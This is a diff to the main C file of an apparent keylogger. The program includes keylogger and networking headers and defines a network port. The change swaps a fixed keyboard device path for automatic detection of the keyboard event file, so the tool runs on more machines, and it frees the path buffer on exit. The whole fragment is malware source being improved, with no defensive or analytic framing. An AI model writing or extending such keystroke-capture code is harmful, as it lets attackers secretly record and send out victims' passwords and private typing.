@@ -6,13 +6,19 @@
 #include <fcntl.h>
 #include "keylogger.h"
 #include "networking.h"
+#include "find_event_file.h"
+
 
 #define PORT "3491"
 
 void print_usage_and_quit(char *application_name);
 
 int main(int argc, char *argv[]){
-    const char KEYBOARD_DEVICE[] = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
+    char *KEYBOARD_DEVICE = get_keyboard_event_file();
+    if(!KEYBOARD_DEVICE){
+        print_usage_and_quit(argv[0]);
+    }
+
     int writeout;
     int keyboard;
 
@@ -64,6 +70,7 @@ int main(int argc, char *argv[]){
 
     close(keyboard);
     close(writeout);
+    free(KEYBOARD_DEVICE);
 
     return 0;
 }
